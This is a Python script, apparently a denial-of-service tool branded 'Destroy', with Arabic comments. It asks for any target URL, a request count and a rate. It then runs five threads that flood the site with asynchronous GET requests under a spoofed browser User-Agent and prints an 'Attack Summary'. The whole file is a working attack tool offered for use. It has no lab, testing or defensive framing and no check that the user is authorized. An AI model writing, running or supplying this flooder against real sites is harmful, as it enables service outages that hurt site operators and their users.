import pyfiglet
import aiohttp
import asyncio
import threading
import time
from colorama import Fore, Style, init
import validators
import os

# تهيئة مكتبة colorama
init(autoreset=True)

# الإحصائيات
successful_requests = 0
failed_requests = 0
total_response_time = 0

# عرض اسم الأداة
def show_tool_name():
    os.system('clear')  # مسح الشاشة قبل عرض اسم الأداة
    ascii_art = pyfiglet.figlet_format("Destroy")
    print(Fore.CYAN + ascii_art)
    print(Fore.GREEN + "[INFO] by screen") 
    print("=================")

# التحقق من صحة الرابط
def get_valid_url():
    while True:
        url = input(Fore.YELLOW + "Enter the target URL: ")
        if validators.url(url):
            print(Fore.GREEN + "[INFO] Valid URL!")
            return url
        else:
            print(Fore.RED + "[ERROR] Invalid URL! Please enter a valid URL.")

# التحقق من إدخال رقم صحيح
def get_valid_number(prompt):
    while True:
        try:
            value = int(input(prompt))
            if value > 0:
                return value
            else:
                print(Fore.RED + "[ERROR] Please enter a positive number.")
        except ValueError:
            print(Fore.RED + "[ERROR] Invalid input! Please enter a valid number.")

# التحقق من إدخال معدل الثواني صحيح
def get_valid_float(prompt):
    while True:
        try:
            value = float(input(prompt))
            if value >= 0:
                return value
            else:
                print(Fore.RED + "[ERROR] Please enter a positive number or 0 for no limit.")
        except ValueError:
            print(Fore.RED + "[ERROR] Invalid input! Please enter a valid number.")

# إرسال الطلب
async def send_request(url, session, request_id):
    global successful_requests, failed_requests, total_response_time
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        }
        start_time = time.time()
        async with session.get(url, headers=headers) as response:
            response_time = time.time() - start_time
            total_response_time += response_time
            successful_requests += 1
            print(Fore.GREEN + f"[{request_id}] Request successful! Status: {response.status}, Time: {response_time:.2f}s")
    except Exception as e:
        failed_requests += 1
        print(Fore.RED + f"[{request_id}] Request failed: {e}")

# تنفيذ الهجوم
async def attack(url, num_requests, rate_limit):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for request_id in range(1, num_requests + 1):
            tasks.append(send_request(url, session, request_id))
            if rate_limit > 0:
                await asyncio.sleep(1 / rate_limit)
        await asyncio.gather(*tasks)

# عرض الإحصائيات
def display_statistics(num_requests):
    global successful_requests, failed_requests, total_response_time
    print(Fore.MAGENTA + "\n[INFO] Attack Summary:")
    print(Fore.CYAN + f"Total Requests: {num_requests}")
    print(Fore.GREEN + f"Successful Requests: {successful_requests}")
    print(Fore.RED + f"Failed Requests: {failed_requests}")
    if successful_requests > 0:
        avg_response_time = total_response_time / successful_requests
        print(Fore.YELLOW + f"Average Response Time: {avg_response_time:.2f}s")
    else:
        print(Fore.YELLOW + "Average Response Time: N/A (No successful requests)")

# الرسالة المتحركة المستمرة
def loading_animation():
    animation = [".", "..", "..."]
    while True:
        for dots in animation:
            print(Fore.CYAN + "[INFO] Please wait" + dots, end="\r")
            time.sleep(0.5)

# بدء الهجوم
def run_attack():
    show_tool_name()  # عرض اسم الأداة
    print(Fore.MAGENTA + "[INFO] Welcome to destroy just enter url.")
    
    url = get_valid_url()  # التحقق من صحة الرابط
    
    num_requests = get_valid_number(Fore.YELLOW + "Enter the number of requests to send: ") 
     # التحقق من عدد الطلبات
    rate_limit = get_valid_float(Fore.YELLOW + "Enter the request rate (requests per second, 0 for no limit): ")  # التحقق من معدل الطلبات
    
    print(Fore.CYAN + f"\n[INFO] Starting attack on: {url}")
    
    # تشغيل الرسالة المتحركة في الخيط الفرعي
    animation_thread = threading.Thread(target=loading_animation)
    animation_thread.daemon = True  # جعل الخيط يعمل في الخلفية
    animation_thread.start()
    
    threads = []
    for _ in range(5):  # تشغيل 5 Threads
        thread = threading.Thread(target=asyncio.run, args=(attack(url, num_requests, rate_limit),))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # عند انتهاء الهجوم، تظهر الإحصائيات
    display_statistics(num_requests)
    print(Fore.GREEN + "[INFO] Attack completed!")

if __name__ == "__main__":
    run_attack()